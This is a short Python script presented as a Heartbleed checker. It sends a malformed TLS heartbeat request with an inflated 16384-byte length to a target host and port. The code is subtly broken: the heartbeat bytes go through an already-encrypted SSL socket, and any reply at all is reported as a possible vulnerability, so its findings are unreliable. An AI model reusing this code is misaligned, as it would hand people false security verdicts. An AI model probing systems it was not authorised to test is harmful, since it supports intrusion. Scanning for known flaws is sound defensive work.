#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: cbk914
import sys
import socket
import ssl
import struct


def create_heartbeat_payload():
    payload = b'\x18\x03\x02\x00\x03'    # TLSv1.1 HeartbeatRequest
    payload += b'\x01\x40\x00'           # Payload length: 16384 bytes
    return payload


def check_heartbleed(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        wrapped_socket = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1_1)
        wrapped_socket.connect((host, port))
       
        print(f'Connected to {host}:{port}')
       
        wrapped_socket.send(create_heartbeat_payload())
        response = wrapped_socket.recv(1024)
       
        if len(response) > 0:
            print(f'Possible Heartbleed vulnerability detected for {host}:{port}')
        else:
            print(f'No Heartbleed vulnerability detected for {host}:{port}')
       
        wrapped_socket.close()
        sock.close()
    except Exception as e:
        print(f'Error: {str(e)}')
        sys.exit(1)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('Usage: python heartbleed_checker.py <host> <port>')
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    check_heartbleed(host, port)
